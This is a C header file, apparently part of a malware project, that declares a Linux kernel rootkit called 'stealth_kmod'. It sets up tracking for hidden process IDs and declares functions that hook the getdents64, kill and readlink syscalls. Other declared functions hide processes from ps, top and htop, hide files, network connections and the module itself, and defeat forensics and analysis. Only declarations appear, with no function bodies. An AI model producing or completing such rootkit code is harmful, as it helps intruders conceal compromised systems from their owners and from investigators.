#pragma once

#include "includes.h"
#include <sys/syscall.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/init.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/version.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/pid_namespace.h>

// Rootkit functionality for deep process hiding
#define ROOTKIT_MODULE_NAME "stealth_kmod"
#define ROOTKIT_HIDDEN_PID_MAX 100

// Hidden process tracking
typedef struct {
    pid_t hidden_pids[ROOTKIT_HIDDEN_PID_MAX];
    int num_hidden;
    BOOL module_loaded;
} rootkit_state_t;

// Function declarations
void rootkit_init(void);
void rootkit_hide_process(pid_t pid);
void rootkit_unhide_process(pid_t pid);
void rootkit_hide_module(void);
void rootkit_cleanup(void);

// Internal functions
static void rootkit_hook_syscalls(void);
static void rootkit_unhook_syscalls(void);
static void rootkit_filter_proc_read(void);
static void rootkit_hide_from_ps(void);
static void rootkit_hide_from_top(void);
static void rootkit_hide_from_htop(void);
static void rootkit_anti_forensics(void);
static void rootkit_hide_network_connections(void);
static void rootkit_hide_files(void);
static void rootkit_anti_analysis(void);

// Syscall hooking
static asmlinkage long rootkit_hooked_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long rootkit_hooked_kill(pid_t pid, int sig);
static asmlinkage long rootkit_hooked_readlink(const char *pathname, char *buf, int bufsiz);

// Original syscalls
static asmlinkage long (*original_getdents64)(unsigned int, struct linux_dirent64 *, unsigned int);
static asmlinkage long (*original_kill)(pid_t, int);
static asmlinkage long (*original_readlink)(const char *, char *, int);
